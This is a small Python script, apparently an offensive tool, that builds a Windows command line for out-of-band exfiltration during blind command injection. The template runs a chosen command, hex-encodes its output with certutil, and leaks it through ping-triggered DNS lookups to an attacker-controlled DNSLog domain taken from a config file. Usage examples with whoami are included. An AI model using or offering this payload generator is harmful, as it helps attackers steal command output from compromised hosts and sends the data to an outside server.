import sys
#author: 617sec //https://github.com/Dr-S1x17

commandTem = r'del command7 && del command7.txt && command > command7 &&echo 11111111111>>command7 && certutil -encodehex command7 command7.txt && for /f "tokens=1-17" %a in (command7.txt) do start /b ping -nc 1 %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.{0}'
with open('config617', 'r') as f:
    command = commandTem.format(f.readlines()[0])
    
if __name__ == '__main__':
    if len(sys.argv)<2:
        print('usage: python3 CommandGen.py Yourcommand No(start)')
        print('like: python3 CommandGen.py whoami (Command will use "start".Start will Send a large number of requests in a short period of time, resulting in lost DNSLog record)')
        print('like: python3 CommandGen.py whoami no (Will No start)')
        sys.exit(0)
    if len(sys.argv) == 2:
        print(command.replace('command',sys.argv[1]))
    else:
        print(command.replace('command',sys.argv[1]).replace('start /b',''))
